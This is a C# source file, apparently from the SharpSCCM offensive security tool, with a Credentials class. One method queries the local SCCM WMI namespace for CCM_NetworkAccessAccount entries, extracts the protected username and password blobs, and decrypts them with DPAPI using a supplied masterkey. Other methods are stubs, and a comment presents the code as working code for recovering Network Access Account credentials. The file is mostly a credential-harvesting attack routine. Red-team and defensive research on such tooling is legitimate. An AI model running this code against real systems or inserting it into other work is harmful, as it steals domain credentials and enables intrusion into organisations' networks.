using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.CommandLine;
using System.CommandLine.Builder;
using System.CommandLine.Parsing;
using System.CommandLine.NamingConventionBinder;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Xml;

// Configuration Manager SDK
using Microsoft.ConfigurationManagement.Messaging;
using Microsoft.ConfigurationManagement.Messaging.Framework;
using Microsoft.ConfigurationManagement.Messaging.Messages;
using Microsoft.ConfigurationManagement.Messaging.Sender.Http;



namespace SharpSCCM
{
    public class Credentials
    {

        public static void LocalNetworkAccessAccountsWmi(string masterkey)
        {
            ManagementScope sccmConnection = Management.NewSccmConnection("\\\\localhost\\root\\ccm\\policy\\Machine\\ActualConfig");
            Management.GetClassInstances(sccmConnection, "CCM_NetworkAccessAccount");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
            ManagementObjectCollection accounts = searcher.Get();
            if (accounts.Count > 0)
            {
                foreach (ManagementObject account in accounts)
                {
                    string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                    string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
                    byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                    int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                    Array.Resize(ref protectedUsernameBytes, length);
                    try
                    {

                        Dpapi.Execute(protectedUsername, masterkey);
                        Dpapi.Execute(protectedPassword, masterkey);

                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                        Console.WriteLine(e.ToString());
                    }
                }
            }
            else
            {
                Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount");
            }
        }

        public static void LocalNetworkAccessAccountsDisk(string masterkey)
        {
            // TO DO
        }


        // -------------------------------------------------------------------------------------------------------------------------------
        // https://gist.github.com/EvanMcBroom/525d84b86f99c7a4eeb4e3495cffcbf0

        [StructLayout(LayoutKind.Sequential)]
        public struct THeaderInfo
        {
            UInt32 nHeaderLength; // Must be 0x14
            UInt32 nEncryptedSize;
            UInt32 nPlainSize;
            UInt32 nAlgorithm;
            UInt32 nFlag;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct GarbledData
        {
            UInt32 dwVersion;
            Byte[] key;
            THeaderInfo header;
            Byte[] pData;
        }

        public static void QueryDecryptNetworkAccessAccount()
        {
            /*
            * Research by Evan McBroom and Chris Thompson (@_Mayyhem)
            * Roger Zander made security recommendations for SCCM based on the claim that NAA credentials could be recovered.
            * Source: https://rzander.azurewebsites.net/network-access-accounts-are-evil/
            * Roger stated that recover was "possible with a few lines of code" but did not provide any code. Here is working code.
            */



        }
    }
}